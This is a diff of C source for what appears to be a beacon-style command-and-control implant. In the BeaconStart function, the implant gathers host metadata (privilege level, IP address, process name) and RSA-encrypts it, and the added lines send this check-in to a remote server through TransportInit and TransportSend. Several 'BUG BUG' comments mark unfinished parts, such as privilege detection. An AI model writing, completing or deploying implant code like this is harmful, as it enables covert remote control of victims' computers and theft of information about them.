@@ -182,6 +182,13 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												break;
 											else Hdr = Buf;
 
+											//
+											// BUG BUG 
+											//
+											// Check if we're SYSTEM or ADMIN,
+											// and OR' the flags here.
+											//
+
 											if (!(Buf = BufferAddUI1( &Ins, Hdr, 2 )))
 												break;
 											else Hdr = Buf;
@@ -210,6 +217,13 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												break;
 											else Hdr = Buf;
 
+											//
+											// BUG BUG BUG
+											//
+											// Add code to calculate the IPv4 address
+											// of the current interface being sent out
+											//
+
 											if (!(Buf = BufferAddUI4( &Ins, Hdr, 0 )))
 												break;
 											else Hdr = Buf;
@@ -230,7 +244,15 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 												break;
 											else Hdr = Buf;
 
-											if (!(Buf = BufferAddRaw( &Ins, Hdr, Exe, strlen(Exe) )))
+											//
+											// BUG BUG
+											//
+											// So, the EXE isnt being converted to ASCII
+											// properly, so we'll have to fix that first
+											// to finish the check-in properly.
+											//
+
+											if (!(Buf = BufferAddUI1( &Ins, Hdr, 'a' )))
 												break;
 											else Hdr = Buf;
 
@@ -240,11 +262,19 @@ DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
 
 											if ((Buf = Ins.api.LocalLock( Hdr )))
 											{
-												Buf->uMagic = BEACON_METADATA_HDR;
+												Buf->uMagic = BEACON_METADATA_MAGIC;
 												Buf->Length = Ins.api.LocalSize( Hdr ) - 8;
 
-												if ( CryptRsaEncryt( &Ins, Buf, Buf->Length + 8, &Ecp, &Ecl ) )
+												if ( CryptRsaEncrypt( &Ins, Buf, Buf->Length + 8, &Ecp, &Ecl ) )
 												{
+													if ( TransportInit( &Ins ) )
+													{
+														if ( TransportSend( &Ins, Ecp, Ecl ) )
+														{
+															/* do nothing */
+														};
+														TransportFree( &Ins );
+													};
 													Ins.api.LocalFree( Ecp );
 												};
 												Ins.api.LocalUnlock( Hdr );
